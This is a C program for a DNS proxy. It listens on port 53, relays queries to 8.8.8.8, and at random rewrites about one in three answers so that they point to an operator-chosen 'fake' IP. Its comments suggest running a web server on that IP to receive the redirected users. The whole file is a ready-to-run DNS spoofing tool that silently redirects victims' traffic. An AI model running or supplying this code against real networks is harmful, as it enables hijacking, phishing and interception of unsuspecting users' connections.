#include<stdio.h>
#include<string.h>
#include<time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include<stdlib.h>

int main(int argc, char ** argv)
{
	int probability = 3; // Will redirect to our fake IP in one of $probability cases
	char ip[4] = {(char)127, (char)0, (char)0, (char)1}; // The "fake" IP. Run HTTPd etc on this.
	char *dns = "8.8.8.8"; // IP address of the DNS server we're proxying
	char buf[512];
	int readc,off, server_sock, client_sock;
	unsigned int length;
	struct sockaddr_storage peer_addr;
	socklen_t peer_addr_len;
	struct sockaddr_in server, from;
	struct hostent *hp;
	struct addrinfo client_hints, server_hints;
	struct addrinfo *result, *rp;

	srand((unsigned int)time(0));
	bzero(&client_hints, sizeof(struct addrinfo));
	bzero(&server_hints, sizeof(struct addrinfo));
	bzero(buf, 512);
	off=0;
			// Set up server
	server_hints.ai_family = AF_INET;
	server_hints.ai_socktype = SOCK_DGRAM;
	server_hints.ai_flags = AI_PASSIVE;
	server_hints.ai_protocol = 0;
	server_hints.ai_canonname = NULL;
	server_hints.ai_addr = NULL;
	server_hints.ai_next = NULL;
	if(getaddrinfo(NULL, "53", &server_hints, &result))
	{
		fprintf(stderr, "server getaddrinfo failed, aborting.\n");
		exit(EXIT_FAILURE);
	}

	for(rp = result; rp != NULL; rp = rp->ai_next)
	{
		if(-1 == (server_sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)))
			continue;
	
		if(!bind(server_sock, rp->ai_addr, rp->ai_addrlen))
			break; // Successfully bound
			close(server_sock);
	}
	
	if(rp == NULL)
	{
		fprintf(stderr, "Could not bind to port 53\n");
		exit(EXIT_FAILURE);
	}
	
	freeaddrinfo(result);
	
	for(;;) {
		peer_addr_len = sizeof(struct sockaddr_storage);
		
		// Read data from client
		if(-1 == (off = recvfrom(server_sock, buf, 512, 0, (struct sockaddr *) &peer_addr, &peer_addr_len)))
			continue;

		// Connect to Google DNS
		client_hints.ai_family = AF_INET;
		client_hints.ai_socktype = SOCK_DGRAM;
		client_hints.ai_flags = 0;
		client_hints.ai_protocol = 0;
		if(getaddrinfo("8.8.8.8", "53", &client_hints, &result))
		{
			fprintf(stderr, "client getaddrinfo failed, aborting.\n");
			exit(EXIT_FAILURE);
		}

		for(rp = result; rp != NULL; rp = rp->ai_next)
		{
			if(-1 == (client_sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)))
				continue;
			if(connect(client_sock, rp->ai_addr, rp->ai_addrlen) != -1)
				break;
		
			close(client_sock);
		}

		if(rp == NULL)
		{
			fprintf(stderr, "Could not connect\n");
               		exit(EXIT_FAILURE);	
		}

		freeaddrinfo(result);

		if(write(client_sock, buf, off) != off)
		{
			fprintf(stderr, "partial/failed write\n");
                	exit(EXIT_FAILURE);	
		}

		bzero(buf, 512);
	
		if(-1 == (off = read(client_sock, buf, 512)))
		{
			perror("read from server");
			exit(EXIT_FAILURE);
		}

		// We're done playing DNS client
		close(client_sock);

		//Random overwrite
		if(!(rand()%probability))
		{
			puts("Overwriting response ;)");
			buf[off-4] = (char)ip[0];
			buf[off-3] = (char)ip[1];
			buf[off-2] = (char)ip[2];
			buf[off-1] = (char)ip[3];
		}
		else
			puts("No overwrite, delivering original result.");

		// Send response to our client
		if(off != sendto(server_sock, buf, off, 0, (struct sockaddr *) &peer_addr, peer_addr_len))
			fprintf(stderr, "Error sending response to client\n");
	}
	return 0;
}
